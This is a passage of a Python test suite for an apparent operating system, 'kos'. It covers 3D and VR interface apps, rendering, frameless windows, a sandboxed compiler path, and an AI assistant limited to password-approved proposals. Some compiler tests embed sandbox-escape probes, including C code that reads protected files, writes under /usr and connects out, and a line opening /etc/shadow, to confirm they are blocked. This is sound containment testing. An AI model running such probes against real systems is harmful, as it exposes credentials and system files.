        self.assertEqual([(m["cmd"], m["ok"]) for m in refusal if m["cmd"] == "result"], [("result", False)])
        self.assertIn("system:notify", refusal[-1]["detail"])
        sh.notify("test", "hello", "there")
        got = [m["cmd"] for m in (self.sent(dock) + self.sent(side))]
        self.assertNotIn("notifications", got)                                     # and the notification list is not pushed to it

    def layer_of(self, shell, name, **flags):
        return TestLooksAndControls.layer(self, shell, name, "plain", (0, 0, 10, 10), **flags)

    sent = TestLooksAndControls.sent

    def test_the_ledger_names_the_trusted_core_and_flags_a_bare_system_app(self):
        from kos import services
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        r = services.report(self.paths)
        self.assertEqual({c["part"].split(" ")[0] for c in r["core"]}, {"authority", "store", "sandbox", "registry", "the", "scene"})
        self.assertEqual(r["blanket"], [])
        out = _sp.run([sys.executable, "-m", "kos", "services"], cwd=str(Path(__file__).resolve().parent.parent),
                      env={**os.environ, "KOS_ROOT": str(self.paths.root)}, capture_output=True, text=True)
        self.assertIn("Trusted core", out.stdout, out.stderr)


class TestBlocksLibrary(Env):
    """Libraries and emulators that survived the move of the looks into interface apps."""

    def test_a_homography_maps_the_unit_square_onto_a_quad_and_back(self):
        from kos import blocks
        quad = [(10, 10), (110, 20), (100, 90), (5, 80)]
        inv = blocks.unit_to_quad(quad)
        for (u, v), (x, y) in zip([(0, 0), (1, 0), (1, 1), (0, 1)], quad):
            A, B, C, D, E, F, G, H, I = inv
            den = G * x + H * y + I
            self.assertAlmostEqual((A * x + B * y + C) / den, u, places=6)
            self.assertAlmostEqual((D * x + E * y + F) / den, v, places=6)
        self.assertTrue(blocks.point_in_quad(quad, 60, 50))
        self.assertFalse(blocks.point_in_quad(quad, 120, 50))
        self.assertIsNone(blocks.unit_to_quad([(0, 0), (1, 1), (2, 2), (3, 3)]))          # a line is not a face

    def test_a_texture_lands_on_its_face_and_transparent_texels_are_skipped(self):
        from kos import blocks
        fb = Framebuffer(4, 4)
        for x in range(4):
            for y in range(4):
                fb.rect(x, y, 1, 1, bytes((0, 0, 255 if x < 2 else 0, 0)) if y < 2 else bytes((0, 255, 0, 0)))
        out = Framebuffer(40, 40)
        blocks.fill_face(out, [(10, 10), (30, 10), (30, 30), (10, 30)], blocks.Texture(fb))
        self.assertEqual(out.pixel(12, 12), (255, 0, 0))                  # the texture's top left
        self.assertEqual(out.pixel(28, 12), (0, 0, 0))                    # its top right is black
        self.assertEqual(out.pixel(20, 28), (0, 255, 0))                  # the bottom half is green
        self.assertEqual(out.pixel(5, 5), (0, 0, 0))                      # nothing outside the quad
        alpha = bytearray(b"\xff" * 16)
        alpha[0] = 0
        out2 = Framebuffer(40, 40)
        blocks.fill_face(out2, [(10, 10), (30, 10), (30, 30), (10, 30)], blocks.Texture(fb, alpha))
        self.assertEqual(out2.pixel(11, 11), (0, 0, 0))                   # the transparent texel left the background alone

    def test_the_camera_looks_straight_on_at_zero_and_sees_tops_when_it_looks_down(self):
        from kos import blocks
        cam = blocks.Camera(0, 0, 320, 180, 0, 1000)
        self.assertEqual([round(v) for v in cam.project(100, 50, 0)[:2]], [100, 50])           # the wallpaper plane is not scaled
        self.assertGreater(abs(cam.project(100, 50, 100)[0] - 320), abs(100 - 320))             # nearer things are drawn larger
        down = blocks.Camera(0, 0.9, 320, 180, 0, 1000)
        nx, ny, nz = down.normal_faces(0, -1, 0)                                             # the top face's normal...
        self.assertGreater(nz, 0)                                                            # ...now points at the viewer
        flat = blocks.Camera(0, 0, 320, 180, 0, 1000)
        self.assertLessEqual(flat.normal_faces(0, -1, 0)[2], 1e-9)                            # straight on: the top is edge-on
        side = blocks.Camera(0.6, 0, 320, 180, 0, 1000)
        self.assertTrue(side.normal_faces(-1, 0, 0)[2] > 0 or side.normal_faces(1, 0, 0)[2] > 0)   # turned: one side comes into view

class TestInterfaceApps(Env):
    """Normal, 3D, VR, AR and the neural interface are apps: the OS keeps only the terminal look, the password prompt and the plumbing that
    tells an interface app what is running, shows its frame and maps clicks back."""

    layer = TestLooksAndControls.layer
    sent = TestLooksAndControls.sent
    ROOT = Path(__file__).resolve().parent.parent / "examples"

    def shell(self, w=320, h=180, interfaces=None):
        from kos.shell import Shell
        self.opened = []

        def opener(name, mode, new=False, taken=frozenset()):
            self.opened.append(name)
            raise RuntimeError("no process in this test")
        return Shell(self.paths, self.authority(PW), HeadlessBackend(w, h), ScriptedDevices(), preboot=(), opener=opener,
                     interfaces_of=lambda: dict(interfaces if interfaces is not None else {"3d": "interface-3d", "vr": "interface-vr"}))

    def scene_layer(self, sh, name="interface-3d"):
        scratch = tempfile.mkdtemp(dir=self.tmp.name)
        L = self.layer(sh, name, "scene", (0, 0, 0, 0), scene=True, scratch=scratch)
        L.visible = False
        sh.scenes["3d"] = L
        sh._activate_scene(L)
        return L

    def frame(self, sh, L, w=None, h=None, rev=1, hits=(), regions=(), caps=None, color=b"\x10\x20\x30\x00"):
        w, h = w or sh.W, h or sh.H
        (Path(L.scratch) / "frame.bin").write_bytes(color * (w * h))
        sh._on_scene(L, {"cmd": "scene", "rev": rev, "w": w, "h": h, "hits": list(hits), "regions": list(regions), "pointer": False,
                         "captures": caps or {"keys": [], "buttons": [], "pointer": False}})

    def test_every_look_but_the_terminal_has_an_interface_app_and_each_is_valid(self):
        for where, name, look in (("system", "interface-normal", "normal"), ("system", "interface-3d", "3d"), ("optional", "interface-vr", "vr"),
                                  ("optional", "interface-ar", "ar"), ("optional", "interface-neural", "neural")):
            m = Manifest.parse((self.ROOT / where / name / "manifest.json").read_bytes())
            self.assertEqual((m.driver, m.look), ("interface", look))
            self.assertIn("compose", m.permissions)
            self.assertNotIn("system:files", m.permissions)                      # it draws; it cannot read files or run things
        self.assertEqual(set(looks_module().LOOKS), {"normal", "3d", "vr", "ar", "neural", "text", "terminal"})

    def test_only_an_interface_app_may_compose_and_it_must_name_its_look(self):
        base = {"name": "x", "version": "1", "runtime": "python", "entry": "m", "modes": ["graphical"]}
        Manifest.parse(json.dumps({**base, "permissions": ["compose"], "driver": "interface", "look": "3d"}).encode())
        for extra in ({"permissions": ["compose"]}, {"permissions": ["compose"], "driver": "camera"},
                      {"driver": "interface", "look": "Not A Look"}, {"look": "3d"}):
            with self.assertRaises(KAppError, msg=str(extra)):
                Manifest.parse(json.dumps({**base, **extra}).encode())

    def test_the_active_interface_app_is_told_what_is_running_and_only_what_changed(self):
        sh = self.shell()
        L = self.scene_layer(sh)
        w = self.layer(sh, "files", "window", (10, 10, 120, 80), ops=[["rect", 0, 0, 120, 80, "#335577"]])
        sh._scene_sync()
        got = self.sent(L)
        state = next(m for m in got if m["cmd"] == "scene_state")
        self.assertEqual([l["name"] for l in state["layers"]], ["files"])        # the interface app itself is never in its own scene
        self.assertEqual(next(m for m in got if m["cmd"] == "scene_layer")["ops"], [["rect", 0, 0, 120, 80, "#335577"]])
        sh._scene_sync()
        self.assertEqual(self.sent(L), [])                                       # nothing changed: nothing sent
        w.ops, w.rev = [["rect", 0, 0, 5, 5, "#ffffff"]], w.rev + 1
        sh._scene_sync()
        self.assertIn("scene_layer", [m["cmd"] for m in self.sent(L)])

    def test_its_frame_is_the_screen_but_only_at_exactly_the_screen_size(self):
        sh = self.shell()
        L = self.scene_layer(sh)
        self.frame(sh, L, w=10, h=10)
        self.assertIsNone(sh._scene_frame)                                       # a frame of the wrong size is refused
        self.assertTrue(any("wrong size" in l for l in sh.log))
        self.frame(sh, L)
        self.assertIsNotNone(sh._scene_frame)
        sh.render()
        self.assertEqual(sh.backend.frames[-1].pixel(100, 100), (0x30, 0x20, 0x10))
        other = self.layer(sh, "interface-vr", "scene", (0, 0, 0, 0), scene=True, scratch=tempfile.mkdtemp(dir=self.tmp.name))
        before = sh._scene_rev
        self.frame(sh, other, rev=99, color=b"\xff\xff\xff\x00")
        self.assertEqual(sh._scene_rev, before)                                  # an interface app that is not on screen cannot draw on it

    def test_only_an_interface_app_may_say_scene_or_press(self):
        sh = self.shell()
        stranger = self.layer(sh, "stranger", "plain", (0, 0, 10, 10))
        stranger._peer.sendall(json.dumps({"cmd": "scene", "rev": 1, "w": 320, "h": 180, "hits": [], "regions": [], "pointer": False,
                                           "captures": {"keys": [], "buttons": [], "pointer": False}}).encode() + b"\n")
        sh._handle_app(stranger)
        self.assertNotIn(stranger.id, sh.layers)                                 # dropped, like any protocol violation

    def test_a_click_on_a_face_reaches_the_layer_where_it_was_aimed_and_a_region_goes_back_to_the_app(self):
        sh = self.shell()
        L = self.scene_layer(sh)
        w = self.layer(sh, "files", "window", (20, 20, 100, 60))
        quad = [[200, 40], [300, 50], [300, 120], [200, 110]]
        region = {"quad": [[10, 140], [60, 140], [60, 170], [10, 170]], "id": "kernel"}
        self.frame(sh, L, hits=[{"id": w.id, "quad": quad}], regions=[region])
        fx, fy = sh._flat(250, 80)
        self.assertTrue(20 <= fx <= 120 and 20 <= fy <= 80)                      # inside the flat rectangle
        self.assertEqual(sh._flat(5, 5), (5, 5))                                 # off every face: unchanged
        self.assertFalse(sh._scene_region(250, 80))                              # a face is in front of any region there
        self.assertTrue(sh._scene_region(30, 150))
        self.assertEqual([m for m in self.sent(L) if m["cmd"] == "input"], [{"cmd": "input", "ev": {"type": "region", "id": "kernel"}}])

    def test_the_os_forwards_only_the_inputs_the_interface_app_declared(self):
        sh = self.shell()
        L = self.scene_layer(sh)
        self.frame(sh, L, caps={"keys": ["alt-left"], "buttons": ["middle"], "pointer": False})
        self.assertTrue(sh._scene_wants({"type": "key", "key": "alt-left"}))
        self.assertFalse(sh._scene_wants({"type": "key", "key": "a"}))           # an ordinary key never goes to it
        self.assertFalse(sh._scene_wants({"type": "button", "button": "left", "pressed": True, "x": 1, "y": 1}))
        self.assertFalse(sh._scene_wants({"type": "pointer", "x": 3, "y": 3}))   # it did not ask for pointer moves
        self.assertTrue(sh._scene_wants({"type": "button", "button": "middle", "pressed": True, "x": 1, "y": 1}))
        self.assertTrue(sh._scene_wants({"type": "pointer", "x": 9, "y": 9}))    # held: the drag is taken
        sh._scene_wants({"type": "button", "button": "middle", "pressed": False, "x": 9, "y": 9})
        self.assertFalse(sh._scene_wants({"type": "pointer", "x": 4, "y": 4}))
        sent = [m["ev"]["type"] for m in self.sent(L) if m["cmd"] == "input"]
        self.assertEqual(sent, ["key", "button", "pointer", "button"])

    def test_press_from_the_active_interface_app_becomes_a_flat_click(self):
        sh = self.shell()
        L = self.scene_layer(sh)
        sh._scene_press(L, {"cmd": "press", "x": 40, "y": 50})
        self.assertEqual([(e["pressed"], e["x"], e["y"], e["flat"]) for e in sh.pending], [(True, 40, 50, True), (False, 40, 50, True)])

    def test_choosing_a_look_starts_its_interface_app_and_a_look_with_no_app_is_the_terminal(self):
        sh = self.shell()
        sh.set_look(look="3d")
        self.assertEqual(self.opened, ["interface-3d"])                          # the opener (the password) was asked for it
        self.assertEqual(sh.cfg["look"], "normal")                               # it would not start: the look did not change
        sh.set_look(look="vr")
        self.assertEqual(self.opened, ["interface-3d", "interface-vr"])
        sh.set_look(look="terminal")                                             # the OS's own look: no app, no password
        self.assertEqual((sh.cfg["look"], sh.scene), ("terminal", None))
        bare = self.shell(interfaces={})
        bare.set_look(look="3d")
        self.assertEqual(bare.cfg["look"], "3d")                                 # nobody installed an app for it: the OS draws it flat

    def test_the_flat_desktop_is_the_fallback_when_an_interface_app_has_not_drawn_yet(self):
        sh = self.shell()
        self.scene_layer(sh)
        self.layer(sh, "dock", "dock", sh.core_rect("dock")[1], [["rect", 0, 0, 50, 20, "#ff0000"]])
        sh.render()
        self.assertGreater(len(sh.backend.frames), 0)                            # a picture exists even before the app's first frame

    def test_the_interface_apps_render_a_frame_of_the_screens_size_and_declare_where_things_are(self):
        import importlib.util
        from kos.scenelib import SceneModel

        def load(where, name):
            spec = importlib.util.spec_from_file_location(name.replace("-", "_"), self.ROOT / where / name / "main.py")
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return mod

        class Fake:
            def send(self, *_):
                pass
            press = send
        for where, name, cls in (("system", "interface-normal", "Flat"), ("system", "interface-3d", "Blocks3D"),
                                 ("optional", "interface-vr", "Stereo"), ("optional", "interface-neural", "Neural")):
            mod = load(where, name)
            model = SceneModel()
            model.apply_state({"w": 320, "h": 180, "u": 1, "titlebar": 24, "ws": 0, "focus": ["w1"], "look": "3d", "layers": [
                {"id": "w1", "name": "files", "kind": "window", "mode": "graphical", "rect": [20, 30, 160, 100], "z": 20, "title": "Files",
                 "visible": True, "minimized": False, "ws": 0, "rev": 1, "slot": "files"},
                {"id": "d1", "name": "dock", "kind": "dock", "mode": "graphical", "rect": [60, 150, 200, 24], "z": 30, "title": "",
                 "visible": True, "minimized": False, "ws": 0, "rev": 1, "slot": "dock"}]})
            model.apply_layer({"id": "w1", "rev": 1, "ops": [["rect", 0, 0, 160, 100, "#223355"], ["hit", 5, 5, 40, 20, "Open"]], "screen": None})
            model.apply_layer({"id": "d1", "rev": 1, "ops": [["rect", 0, 0, 200, 24, "#334466"]], "screen": None})
            iface = getattr(mod, cls)(model, Fake(), *((False,) if cls == "Stereo" else ()))
            frame, hits, regions = iface.render()
            self.assertEqual((frame.width, frame.height), (320, 180), name)
            for h in hits:
                self.assertIn(h["id"], {"w1", "d1"}, name)
                self.assertEqual(len(h["quad"]), 4, name)

    def blocks3d(self):
        import importlib.util
        from kos.scenelib import SceneModel
        spec = importlib.util.spec_from_file_location("interface_3d_main", self.ROOT / "system" / "interface-3d" / "main.py")
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        asked = []

        class App:
            def request_sys(self, kind, arg=""):
                asked.append(("sys", kind))

            def request_look(self, look):
                asked.append(("look", look))

            def request_open(self, app, mode="tui", command="", line=""):
                asked.append(("open", app))

            def send(self, *_):
                pass

        class Runner:
            app = App()
        model = SceneModel()
        model.apply_state({"w": 640, "h": 360, "u": 1, "titlebar": 24, "ws": 0, "focus": [], "look": "3d", "layers": []})
        return mod.Blocks3D(model, Runner()), asked

    def test_the_3d_hardware_blocks_are_the_real_machine_and_each_opens_its_monitor(self):
        iface, asked = self.blocks3d()
        self.assertEqual([k for k, *_ in iface.hardware_items()], [])                      # nothing known yet: one general block
        iface.tick(100.0)
        self.assertEqual(asked, [("sys", "resources"), ("sys", "devices"), ("sys", "network")])
        iface.tick(101.0)
        self.assertEqual(len(asked), 3)                                                      # asked again only after a while
        iface.on_event({"cmd": "sys", "kind": "resources", "data": {"cpu_model": "Test CPU", "cpus": 8, "load": [0.5, 0, 0], "mem_kb": {"MemTotal": 8 << 20, "MemAvailable": 4 << 20}}})
        iface.on_event({"cmd": "sys", "kind": "devices", "data": {"disks": [{"name": "nvme0n1", "size": 5 * 10 ** 11, "rotational": False, "model": "Fast"}],
                                                                   "input": [{"name": "Keyboard"}]}})
        iface.on_event({"cmd": "sys", "kind": "network", "data": {"interfaces": [{"name": "lo"}, {"name": "ifb0"}, {"name": "eth0", "state": "up", "ipv4": "10.0.0.2"}]}})
        items = {k: (t, app) for k, t, _, app in iface.hardware_items()}
        self.assertEqual(items, {"cpu": ("CPU", "resources"), "ram": ("RAM", "memory"), "disk-nvme0n1": ("NVME0N1", "devices"),
                                 "net-eth0": ("ETH0", "network"), "input": ("INPUT", "devices")})   # no loopback or virtual interfaces
        names = [b.name for b in iface.system_blocks()]
        self.assertEqual(names, ["kernel", "cpu", "ram", "disk-nvme0n1", "net-eth0", "input"])
        self.assertFalse(iface.on_event({"cmd": "sys", "kind": "files", "data": {}}))        # only the three facts it asked for

    def test_clicking_the_ground_goes_back_to_the_terminal_and_a_block_opens_its_app(self):
        iface, asked = self.blocks3d()
        iface.regions_by_id = {"ground": ("terminal", "", ""), "cpu-system": ("resources", "", "")}
        iface.on_input({"type": "region", "id": "ground"})
        iface.on_input({"type": "region", "id": "cpu-system"})
        self.assertEqual(asked, [("look", "terminal"), ("open", "resources")])
        from kos import blocks
        frame, hits, regions = iface.render()
        ids = [r["id"] for r in regions]
        if "ground" in ids:
            self.assertEqual(ids[-1], "ground")                                              # last: anything standing on it wins

    def test_a_homography_inverse_finds_where_in_a_quad_a_point_is(self):
        from kos.quad import point_in_quad, polygon_area, unproject_quad
        quad = [(100, 100), (200, 100), (200, 150), (100, 150)]
        self.assertEqual(unproject_quad(quad, 150, 125, 100, 50), (50.0, 25.0))
        self.assertIsNone(unproject_quad(quad, 10, 10, 100, 50))
        self.assertTrue(point_in_quad(quad, 150, 125) and not point_in_quad(quad, 99, 125))
        self.assertAlmostEqual(polygon_area(quad), 5000.0)


class TestClearBackgrounds(Env):
    """See-through colours and frameless windows: an app is whatever shape it draws, and a click goes through where it draws nothing."""

    layer = TestLooksAndControls.layer
    sent = TestLooksAndControls.sent
    make = TestLooksAndControls.make

    ORB = [["poly", [[50 + 40 * __import__("math").cos(i * 0.2), 50 + 40 * __import__("math").sin(i * 0.2)] for i in range(32)], "#3366ff"],
           ["rect", 80, 5, 15, 15, "#ff0000"], ["drag", 0, 30, 100, 70], ["hit", 80, 5, 15, 15, "Close"]]

    def test_alpha_colours_are_valid_and_blend_over_what_is_beneath(self):
        for ok in ("#112233", "#11223380", "#AABBCCDD"):
            validate_app_message({"cmd": "frame", "ops": [["rect", 0, 0, 5, 5, ok]]}, "graphical")
        for bad in ("#1122", "#1122334", "#112233801", "112233", "#gg223344"):
            with self.assertRaises(ProtocolError, msg=bad):
                validate_app_message({"cmd": "frame", "ops": [["rect", 0, 0, 5, 5, bad]]}, "graphical")
        fb = Framebuffer(10, 10)
        fb.apply([["clear", "#ffffff"], ["rect", 0, 0, 5, 10, "#00000080"], ["rect", 5, 0, 5, 10, "#00000000"],
                  ["line", 0, 9, 9, 9, "#ff000080"], ["poly", [[6, 0], [10, 0], [10, 4]], "#00000080", 255]])
        left = fb.pixel(1, 1)[0]
        self.assertTrue(120 <= left <= 135)                                       # about half way from white to black
        self.assertEqual(fb.pixel(8, 8), (255, 255, 255))                         # alpha 0 changes nothing
        self.assertTrue(fb.pixel(3, 9)[1] < 140 and fb.pixel(3, 9)[0] > 170)      # a half-red line blends
        self.assertTrue(120 <= fb.pixel(9, 1)[0] <= 135)                          # a polygon's colour alpha is used too

    def test_a_frameless_manifest_is_graphical_only_and_the_frame_key_is_checked(self):
        base = {"name": "x", "version": "1", "runtime": "python", "entry": "m"}
        self.assertEqual(Manifest.parse(json.dumps({**base, "modes": ["graphical"], "frame": "none"}).encode()).frame, "none")
        self.assertEqual(Manifest.parse(json.dumps({**base, "modes": ["graphical"]}).encode()).frame, "window")
        for bad in ({"modes": ["tui"], "frame": "none"}, {"modes": ["graphical", "tui"], "frame": "none"}, {"modes": ["graphical"], "frame": "round"}):
            with self.assertRaises(KAppError, msg=str(bad)):
                Manifest.parse(json.dumps({**base, **bad}).encode())
        m = Manifest.parse((Path(__file__).resolve().parent.parent / "examples" / "optional" / "orb" / "manifest.json").read_bytes())
        self.assertEqual((m.frame, m.runtime), ("none", "npm"))

    def test_a_frameless_window_has_no_frame_and_the_whole_rect_is_its_content(self):
        s = self.make()
        w = self.layer(s, "orb", "window", (100, 100, 100, 100), self.ORB, frameless=True)
        self.assertEqual(s.content_rect(w), (100, 100, 100, 100))
        self.assertIsNone(s.chrome_hit(w, 105, 102))                              # no title bar, no traffic lights
        framed = self.layer(s, "files", "window", (300, 100, 100, 100))
        self.assertEqual(s.content_rect(framed)[1], 100 + s.titlebar)
        before = s.compose().copy()
        self.assertEqual(before.pixel(150, 150), (0x33, 0x66, 0xff))              # the disc
        self.assertNotEqual(before.pixel(102, 102), (0x33, 0x66, 0xff))
        wall = s._wallpaper()
        self.assertEqual(before.pixel(102, 102), wall.pixel(102, 102))             # outside the disc: just the wallpaper (no shadow, no body)

    def test_a_click_on_the_clear_part_goes_to_what_is_behind_and_on_the_shape_to_the_window(self):
        s = self.make()
        s.booted.add("mouse")
        behind = self.layer(s, "pins", "plain", (0, 0, 400, 400), [["rect", 0, 0, 400, 400, "#202020"]])
        w = self.layer(s, "orb", "window", (100, 100, 100, 100), self.ORB, frameless=True)
        self.assertIs(s.at(150, 150), w)                                          # on the disc
        self.assertIs(s.at(102, 102), behind)                                     # in the clear corner
        self.assertIs(s.at(500, 500), None)
        s.route({"type": "button", "button": "left", "pressed": True, "x": 102, "y": 102})
        self.assertTrue(any(m["cmd"] == "button" for m in self.sent(behind)))
        self.assertEqual([m for m in self.sent(w) if m["cmd"] == "button"], [])

    def test_the_apps_drag_handle_moves_the_window_and_other_clicks_reach_the_app(self):
        s = self.make()
        s.booted.add("mouse")
        w = self.layer(s, "orb", "window", (100, 100, 100, 100), self.ORB, frameless=True)
        s.route({"type": "button", "button": "left", "pressed": True, "x": 150, "y": 160})      # inside the declared drag rectangle
        self.assertEqual(s.drag[0], w.id)
        s.route({"type": "pointer", "x": 200, "y": 210})
        self.assertEqual(w.rect[:2], [150, 150])
        s.route({"type": "button", "button": "left", "pressed": False, "x": 200, "y": 210})
        self.assertIsNone(s.drag)
        self.sent(w)
        s.route({"type": "button", "button": "left", "pressed": True, "x": w.rect[0] + 87, "y": w.rect[1] + 12})   # the close button: not a handle
        self.assertIsNone(s.drag)
        self.assertEqual([(m["x"], m["y"]) for m in self.sent(w) if m["cmd"] == "button"], [(87, 12)])

    def test_the_terminal_look_lists_a_frameless_window_and_a_way_to_close_it(self):
        s = self.make()
        self.layer(s, "orb", "window", (100, 100, 100, 100), self.ORB, frameless=True)
        got = [(c.label, c.kind) for c in s.controls()]
        self.assertIn(("orb", "focus"), got)
        self.assertIn(("Close", "close"), got)
        self.assertIn(("Close", "hit"), got)                                        # and the app's own declared control


class TestCompilerPath(Env):
    """A line of C, C++, Go, JavaScript, Perl, ... is built and run by the machine's own toolchain inside the sandbox."""

    def run_line(self, language, code, timeout=30.0):
        from kos import coderun
        out = []
        status = coderun.run_code(self.paths, lambda: self.authority(PW), code, language, out=out.append, timeout=timeout)
        return status, "\n".join(out)

    def need(self, language):
        from kos import compiler
        tool, why = compiler.find_tool(language)
        if tool is None:
            self.skipTest(why)

    def test_fragments_are_wrapped_into_programs_and_languages_are_told_apart(self):
        from kos import compiler, lang
        self.assertIn("int main(void)", compiler._wrap("c", 'printf("hi\\n")'))
        self.assertIn(";\nreturn 0;", compiler._wrap("c", 'printf("hi\\n")'))                     # a missing semicolon is supplied
        self.assertEqual(compiler._wrap("c", "int main(){return 0;}").count("main"), 1)            # a whole program is left alone
        self.assertIn("using namespace std", compiler._wrap("c++", "cout << 1;"))
        go = compiler._wrap("go", 'fmt.Println(strings.ToUpper("x"))')
        self.assertIn("package main", go)
        self.assertIn('"fmt"', go)
        self.assertIn('"strings"', go)
        self.assertNotIn('"os"', go)                                                               # only the packages it names
        self.assertIn("fn main()", compiler._wrap("rust", 'println!("x");'))
        self.assertTrue(compiler._wrap("php", "echo 1;").startswith("<?php"))
        self.assertEqual(compiler.canonical("rust/go", "func main() {}"), "go")
        self.assertEqual(compiler.canonical("rust/go", "fn main() {}"), "rust")
        self.assertEqual(compiler.canonical("c", "std::cout << 1;"), "c++")
        self.assertEqual(lang.split_language_prefix("go: fmt.Println(1)"), ("go", "fmt.Println(1)"))
        self.assertEqual(lang.split_language_prefix("go home now"), (None, "go home now"))        # ordinary words are not a prefix
        self.assertEqual(lang.interpret("js: console.log(1)").argv[-1], "--code=console.log(1)")
        self.assertEqual(lang.interpret("std::cout << 1;").language, "c++")

    def test_c_runs_in_the_sandbox_and_prints(self):
        self.need("c")
        status, out = self.run_line("c", 'printf("hello from C %d\\n", 6 * 7);')
        self.assertEqual(status, 0, out)
        self.assertIn("hello from C 42", out)

    def test_other_languages_run_too(self):
        for language, code, want in (("c++", 'cout << "cpp " << 6 * 7 << endl;', "cpp 42"),
                                     ("javascript", "console.log('js', 6 * 7)", "js 42"),
                                     ("perl", 'print "perl ", 6 * 7, "\\n";', "perl 42"),
                                     ("php", 'echo "php " . 6 * 7;', "php 42")):
            self.need(language)
            status, out = self.run_line(language, code)
            self.assertIn(want, out, (language, out))

    def test_go_builds_and_runs_with_its_cache_in_the_scratch_directory(self):
        self.need("go")
        status, out = self.run_line("go", 'fmt.Println("go", 6*7)', timeout=60)
        self.assertIn("go 42", out)

    def test_a_compile_error_is_an_answer_not_a_crash(self):
        self.need("c")
        status, out = self.run_line("c", "this is not c;")
        self.assertIn("error", out)
        self.assertIn("[build failed", out)

    def test_what_the_program_does_stays_inside_the_sandbox(self):
        self.need("c")
        code = ('''#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(void) {
  FILE *f = fopen("/var/lib/kos/secret-test", "r"); printf("read-state:%d\\n", f != NULL);
  FILE *g = fopen("/usr/kos-escape", "w"); printf("write-usr:%d\\n", g != NULL);
  FILE *h = fopen("scratch-ok.txt", "w"); printf("write-scratch:%d\\n", h != NULL);
  int s = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in a = {0}; a.sin_family = AF_INET; a.sin_port = htons(53);
  inet_pton(AF_INET, "1.1.1.1", &a.sin_addr); printf("network:%d\\n", s >= 0 && connect(s, (struct sockaddr*)&a, sizeof a) == 0);
  return 0; }''')
        status, out = self.run_line("c", code)
        for line in ("read-state:0", "write-usr:0", "write-scratch:1", "network:0"):
            self.assertIn(line, out, out)

    def test_a_program_that_never_ends_is_stopped(self):
        from kos import compiler
        self.need("c")
        with mock.patch.object(compiler, "RUN_LIMIT", 2):
            status, out = self.run_line("c", "for (;;) {}")
        self.assertIn("stopped", out)

    def test_a_toolchain_the_sandbox_cannot_read_is_reported_not_widened_for(self):
        from kos import compiler
        with mock.patch("kos.compiler.shutil.which", lambda name: "/root/.cargo/bin/rustc"):
            with self.assertRaises(compiler.CompilerError) as ctx:
                compiler.plan("rust", 'println!("x");')
        self.assertIn("cannot read", str(ctx.exception))
        with self.assertRaises(compiler.CompilerError):
            compiler.plan("cobol", "DISPLAY 1.")
        status, out = self.run_line("java", "public static void main(String[] a) {}")
        self.assertEqual(status, 66)
        self.assertIn("nothing was run", out)

    def test_the_security_scan_and_the_password_still_come_first(self):
        status, out = self.run_line("c", 'FILE *f = fopen("/etc/shadow", "r");')
        self.assertEqual(status, 3)
        self.assertIn("blocked by the security scan", out)


class TestAssistantPermission(Env):
    """An AI assistant is an app that can only propose; nothing runs unless the owner types the password."""

    layer = TestLooksAndControls.layer
    sent = TestLooksAndControls.sent

    def shell(self, *answers):
        from kos.shell import Shell
        return Shell(self.paths, self.authority(*answers), HeadlessBackend(320, 180), ScriptedDevices(), preboot=(), keep_prompter=True)

    def test_a_plan_is_bounded_and_may_only_launch_and_look(self):
        ok = validate_app_message({"cmd": "request", "action": "propose", "title": "t", "steps": [{"action": "open", "app": "files", "mode": "graphical"}]}, "graphical")
        self.assertEqual(ok["steps"][0]["app"], "files")
        too_many = [{"action": "apps"}] * 9
        for bad in ([], too_many, [{"action": "save", "path": "/x", "text": "y"}], [{"action": "signal", "pid": 1, "sig": "KILL"}],
                    [{"action": "sudo", "op": "open"}], [{"action": "permit", "app": "x"}], [{"action": "mods", "op": "enable", "name": "x"}],
                    [{"action": "propose", "title": "x", "steps": [{"action": "apps"}]}], [{"action": "open"}], ["open files"], "open files"):
            with self.assertRaises(ProtocolError, msg=str(bad)[:40]):
                validate_app_message({"cmd": "request", "action": "propose", "title": "t", "steps": bad}, "graphical")

    def test_only_an_assistant_may_hold_the_assist_permission(self):
        base = {"name": "x", "version": "1", "runtime": "python", "entry": "m", "modes": ["graphical"]}
        Manifest.parse(json.dumps({**base, "permissions": ["assist"], "driver": "assistant"}).encode())
        for extra in ({"permissions": ["assist"]}, {"permissions": ["assist"], "driver": "neural"}):
            with self.assertRaises(KAppError, msg=str(extra)):
                Manifest.parse(json.dumps({**base, **extra}).encode())
        shipped = Manifest.parse((Path(__file__).resolve().parent.parent / "examples" / "optional" / "assistant" / "manifest.json").read_bytes())
        self.assertEqual((shipped.driver, shipped.scopes), ("assistant", {"apps"}))                 # it holds the one scope it uses

    def test_an_app_that_is_not_an_assistant_cannot_propose(self):
        sh = self.shell()
        plain = self.layer(sh, "stranger", "plain", (0, 0, 10, 10), system=True, scopes=frozenset({"apps"}))
        sh._on_request(plain, {"cmd": "request", "action": "propose", "title": "t", "steps": [{"action": "apps"}]})
        msg = [m for m in self.sent(plain) if m.get("cmd") == "result"][-1]
        self.assertFalse(msg["ok"])
        self.assertIn("assist", msg["detail"])

    def test_every_step_needs_a_scope_the_assistant_holds(self):
        sh = self.shell()
        ai = self.layer(sh, "assistant", "plain", (0, 0, 10, 10), system=True, scopes=frozenset({"apps"}), assistant=True)
        sh._on_request(ai, {"cmd": "request", "action": "propose", "title": "t", "steps": [{"action": "ls", "path": "/"}]})
        msg = [m for m in self.sent(ai) if m.get("cmd") == "result"][-1]
        self.assertFalse(msg["ok"])
        self.assertIn("system:files", msg["detail"])

    def test_nothing_runs_without_the_password_and_a_sudo_window_does_not_approve(self):
        sh = self.shell("not the password", "not it either", "no")
        ai = self.layer(sh, "assistant", "plain", (0, 0, 10, 10), system=True, scopes=frozenset({"apps"}), assistant=True)
        ran = []
        sh.open_window = lambda name, cmd=None, **kw: ran.append(name)
        plan = {"cmd": "request", "action": "propose", "title": "look", "steps": [{"action": "open", "app": "files", "mode": "graphical"}]}
        sh._on_request(ai, plan)
        msg = [m for m in self.sent(ai) if m.get("cmd") == "result"][-1]
        self.assertFalse(msg["ok"])
        self.assertIn("did not approve", msg["detail"])
        self.assertEqual(ran, [])
        from kos import auth
        self.assertEqual(auth.LAYER_OF["assistant.plan"], "command")
        self.assertIn("assistant.plan", auth.NEVER_REMEMBERED)                                     # a sudo window never approves a plan
        sh2 = self.shell(PW)                                                                          # one answer: it opens the sudo window...
        sh2.authority.sudo_open(5, ("interface", "app", "command"))
